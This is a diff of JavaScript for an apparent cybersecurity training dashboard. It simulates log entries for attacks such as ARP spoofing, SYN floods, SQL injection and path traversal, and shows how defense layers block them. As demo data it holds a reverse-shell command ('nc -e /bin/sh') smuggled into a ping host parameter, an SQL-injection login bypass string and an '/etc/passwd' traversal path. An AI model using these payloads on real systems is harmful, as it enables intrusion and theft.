+      throw new Error(data.message || 'Target chưa xác nhận trạng thái cờ con L7.');
+    }
+    updateDefenseUI(data.defense_l3_app, data.defense_layers, data.current_state);
+  } catch (error) {
+    document.getElementById('defense-error').textContent = error.message;
+  }
+}
+
 async function toggleDefense() {
   const button = document.getElementById('btn-toggle-defense');
   button.disabled = true;
@@ -1614,11 +2041,11 @@ async function toggleDefense() {
     const unknown = typeof state.defenseL3Active !== 'boolean';
     const res = await fetch(unknown ? '/api/defense/status' : '/api/defense/toggle', unknown ? {} : {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ enabled: !state.defenseL3Active }),
+      body: JSON.stringify({ layer: 'l3', enabled: !state.defenseL3Active }),
     });
     const data = await res.json();
     if (!res.ok || typeof data.defense_l3_app !== 'boolean') throw new Error(data.message || 'Target chưa xác nhận trạng thái.');
-    updateDefenseUI(data.defense_l3_app);
+    updateDefenseUI(data.defense_l3_app, data.defense_layers, data.current_state);
   } catch (error) {
     updateDefenseUI(null);
     document.getElementById('defense-error').textContent = error.message;
@@ -1657,10 +2084,23 @@ function closeModal() {
 }
 
 // ==========================================
-// 7. TRAFFIC SIMULATOR (DEMO ASSISTANT)
+// 7. TRAFFIC SIMULATOR & CROSS-LAYER FUNNEL DEMO ASSISTANT (W5-T1 / W5-T3)
 // ==========================================
 async function simulateTraffic(type) {
   let logPayload = null;
+
+  // Kiểm tra trạng thái chi tiết của từng Lớp Khiên (L1 Network, L2 OS, L3 App & L7 Sub-flags)
+  const l1On = Boolean(state.defenseL1Active);
+  const l2On = Boolean(state.defenseL2Active);
+  const l3SqliOn = Boolean(
+    state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.anti_sqli),
+  );
+  const l3RateLimitOn = Boolean(
+    state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.rate_limit),
+  );
+  const l3SanitizerOn = Boolean(
+    state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.input_sanitization),
+  );
 
   if (type === 'ping') {
     logPayload = {
@@ -1673,6 +2113,7 @@ async function simulateTraffic(type) {
       payload_summary: { query: { t: Date.now() }, echo: 'ping-check' },
       attack_tag: 'NORMAL',
       is_suspicious: false,
+      defense_action: 'allowed',
     };
   } else if (type === 'normal-login') {
     logPayload = {
@@ -1688,42 +2129,50 @@ async function simulateTraffic(type) {
       },
       attack_tag: 'NORMAL',
       is_suspicious: false,
+      defense_action: 'allowed',
     };
   } else if (type === 'arp-spoof') {
     logPayload = {
       timestamp: new Date().toISOString(),
       method: 'ARP',
       endpoint: '/L2/arp-cache-poison (Gratuitous ARP Reply)',
-      status_code: 200,
+      status_code: l1On ? 403 : 200,
       response_time: 1,
       client_ip: '172.20.0.66',
       payload_summary: {
         spoofed_ip: '172.20.0.20',
         spoofed_mac: '02:42:ac:14:00:42',
+        l1_static_arp: l1On ? 'ENFORCED (PERMANENT NUD)' : 'DYNAMIC (VULNERABLE)',
         body_preview: { username: 'engineer_user', password: 'pass123' },
         token_preview: 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJlbmdpbmVlcl91c2VyIn0.mitm_captured',
-        detected_patterns: ['ARP_CACHE_POISONING', 'MITM_HTTP_SNIFF'],
+        detected_patterns: l1On ? ['BLOCKED_BY_L1_STATIC_ARP'] : ['ARP_CACHE_POISONING', 'MITM_HTTP_SNIFF'],
       },
       attack_tag: 'ARP_SPOOF',
       is_suspicious: true,
-      defense_action: 'monitored',
+      defense_action: l1On ? 'blocked' : 'monitored',
     };
   } else if (type === 'syn-flood') {
+    const synBlockedByL1 = l1On;
+    const synMitigatedByL2 = !l1On && l2On;
     logPayload = {
       timestamp: new Date().toISOString(),
       method: 'TCP',
       endpoint: '/L4/tcp-syn-flood (Flags: SYN, Port: 8000, Rate: 150 pps)',
-      status_code: 503,
-      response_time: 420,
+      status_code: synBlockedByL1 ? 429 : synMitigatedByL2 ? 200 : 503,
+      response_time: synBlockedByL1 ? 4 : synMitigatedByL2 ? 18 : 420,
       client_ip: '172.20.0.66',
       payload_summary: {
         pps: 150,
-        backlog_queue: 'SYN_RECV_OVERFLOW',
+        backlog_queue: synBlockedByL1
+          ? 'L1_IPTABLES_SYN_LIMIT_DROPPED'
+          : synMitigatedByL2
+            ? 'L2_TCP_SYNCOOKIES_MITIGATED'
+            : 'SYN_RECV_OVERFLOW',
         detected_patterns: ['HALF_OPEN_SYN_FLOOD'],
       },
       attack_tag: 'SYN_FLOOD',
       is_suspicious: true,
-      defense_action: 'monitored',
+      defense_action: synBlockedByL1 ? 'rate_limited' : synMitigatedByL2 ? 'blocked' : 'monitored',
     };
   } else if (type === 'rst-inject') {
     const seqNum = Math.floor(200000000 + Math.random() * 700000000);
@@ -1731,34 +2180,36 @@ async function simulateTraffic(type) {
       timestamp: new Date().toISOString(),
       method: 'TCP',
       endpoint: `/L4/tcp-rst-injection (Flags: RST, SEQ=${seqNum})`,
-      status_code: 499,
+      status_code: l1On ? 403 : 499,
       response_time: 2,
       client_ip: '172.20.0.66',
       payload_summary: {
         seq_num: seqNum,
         victim_ip: '172.20.0.10',
         target_ip: '172.20.0.20',
+        l1_iptables_filter: l1On ? 'DROPPED_FORGED_RST' : 'BYPASSED',
         detected_patterns: ['FORGED_TCP_RST_PACKET'],
       },
       attack_tag: 'RST_INJECTION',
       is_suspicious: true,
-      defense_action: 'monitored',
+      defense_action: l1On ? 'blocked' : 'monitored',
     };
   } else if (type === 'sqli') {
     logPayload = {
       timestamp: new Date().toISOString(),
       method: 'POST',
       endpoint: '/api/auth/login',
-      status_code: state.defenseL3Active ? 401 : 200,
+      status_code: l3SqliOn ? 401 : 200,
       response_time: Math.floor(Math.random() * 25) + 8,
       client_ip: '172.20.0.66',
       payload_summary: {
         body_preview: { username: "admin' OR '1'='1' --", password: '******' },
+        cross_layer_note: l1On || l2On ? 'Passed L1/L2 (Valid TCP/HTTP) -> Inspected at L3' : 'Direct L7 Exploit',
         detected_patterns: ['SQL_INJECTION_AUTH_BYPASS'],
       },
       attack_tag: 'SQL_INJECTION',
       is_suspicious: true,
-      defense_action: state.defenseL3Active ? 'sanitized' : 'allowed',
+      defense_action: l3SqliOn ? 'sanitized' : 'allowed',
     };
   } else if (type === 'brute-force') {
     state.bruteForceCounter += 1;
@@ -1766,60 +2217,69 @@ async function simulateTraffic(type) {
       timestamp: new Date().toISOString(),
       method: 'POST',
       endpoint: '/api/auth/login',
-      status_code: state.defenseL3Active ? 429 : 401,
+      status_code: l3RateLimitOn ? 429 : 401,
       response_time: Math.floor(Math.random() * 14) + 6,
       client_ip: '172.20.0.66',
       payload_summary: {
         body_preview: { username: 'admin', password: `rockyou_pass_${state.bruteForceCounter}` },
         attempts_count: state.bruteForceCounter,
         rate_rps: 1,
+        cross_layer_note: l1On ? 'Bypassed L1 iptables (Low-rate 1 req/s) -> Caught by L3 Token Bucket' : 'Low-rate 1 req/s',
         detected_patterns: ['LOW_RATE_BRUTE_FORCE_1RPS'],
       },
       attack_tag: 'BRUTE_FORCE',
       is_suspicious: true,
-      defense_action: state.defenseL3Active ? 'rate_limited' : 'allowed',
+      defense_action: l3RateLimitOn ? 'rate_limited' : 'allowed',
     };
   } else if (type === 'reverse-shell') {
     const shellCmd = 'nc -e /bin/sh 172.20.0.66 4444';
+    const blockedAtL3 = l3SanitizerOn;
+    const blockedAtL2 = !l3SanitizerOn && l2On;
     logPayload = {
       timestamp: new Date().toISOString(),
       method: 'GET',
       endpoint: `/api/system/network-ping?host=127.0.0.1;${encodeURIComponent(shellCmd)}`,
-      status_code: state.defenseL3Active ? 400 : 200,
+      status_code: blockedAtL3 ? 400 : blockedAtL2 ? 403 : 200,
       response_time: Math.floor(Math.random() * 40) + 18,
       client_ip: '172.20.0.66',
       payload_summary: {
         query: { host: `127.0.0.1; ${shellCmd}` },
         shell_cmd: shellCmd,
+        defense_layer: blockedAtL3
+          ? 'BLOCKED_AT_L3_INPUT_SANITIZER'
+          : blockedAtL2
+            ? 'BLOCKED_AT_L2_OS_NOLOGIN_CGROUPS'
+            : 'COMPROMISED_REVERSE_SHELL_ACTIVE',
         detected_patterns: ['OS_COMMAND_INJECTION', 'REVERSE_SHELL_SPAWN'],
       },
       attack_tag: 'COMMAND_INJECTION',
       is_suspicious: true,
-      defense_action: state.defenseL3Active ? 'blocked' : 'allowed',
+      defense_action: blockedAtL3 ? 'sanitized' : blockedAtL2 ? 'blocked' : 'allowed',
     };
   } else if (type === 'fd-exhaust') {
     logPayload = {
       timestamp: new Date().toISOString(),
       method: 'POST',
       endpoint: '/OS/fd-exhaustion (ulimit/lsof saturation & fork bomb)',
-      status_code: 503,
-      response_time: 310,
+      status_code: l2On ? 403 : 503,
+      response_time: l2On ? 15 : 310,
       client_ip: '172.20.0.66',
       payload_summary: {
-        open_fds: 968,
-        max_fds: 1024,
+        open_fds: l2On ? 164 : 968,
+        max_fds: l2On ? 512 : 1024,
+        l2_os_limits: l2On ? 'CONTAINED (ulimit -n 512, cgroups pids.max=50)' : 'UNLIMITED (EMFILE EXHAUSTED)',
         detected_patterns: ['EMFILE_TOO_MANY_OPEN_FILES', 'FD_TABLE_EXHAUSTION'],
       },
       attack_tag: 'FD_EXHAUSTION',
       is_suspicious: true,
-      defense_action: 'monitored',
+      defense_action: l2On ? 'blocked' : 'monitored',
     };
   } else if (type === 'path-traversal') {
     logPayload = {
       timestamp: new Date().toISOString(),
       method: 'GET',
       endpoint: '/api/files/download?name=../../../../etc/passwd',
-      status_code: state.defenseL3Active ? 400 : 200,
+      status_code: l3SanitizerOn ? 400 : 200,
       response_time: Math.floor(Math.random() * 20) + 7,
       client_ip: '172.20.0.66',
       payload_summary: {
@@ -1829,20 +2289,23 @@ async function simulateTraffic(type) {
       },
       attack_tag: 'PATH_TRAVERSAL',
       is_suspicious: true,
-      defense_action: state.defenseL3Active ? 'blocked' : 'allowed',
+      defense_action: l3SanitizerOn ? 'blocked' : 'allowed',
     };
   } else if (type === 'dos') {
     logPayload = {
       timestamp: new Date().toISOString(),
       method: 'GET',
       endpoint: '/api/heavy-load?iterations=500000',
-      status_code: state.defenseL3Active ? 429 : 200,
-      response_time: Math.floor(Math.random() * 300) + 150,
+      status_code: l3RateLimitOn ? 429 : 200,
+      response_time: l3RateLimitOn ? 5 : Math.floor(Math.random() * 300) + 150,
       client_ip: '192.168.1.200',
-      payload_summary: { query: { iterations: 500000 } },
+      payload_summary: {
+        query: { iterations: 500000 },
+        cross_layer_note: l1On ? 'Bypassed L1 SYN Filter (Single TCP connection) -> Blocked at L3 Rate Limiter' : 'Heavy CPU load',
+      },
       attack_tag: 'HEAVY_DOS',
       is_suspicious: true,
-      defense_action: state.defenseL3Active ? 'rate_limited' : 'allowed',
+      defense_action: l3RateLimitOn ? 'rate_limited' : 'allowed',
     };
   }
 
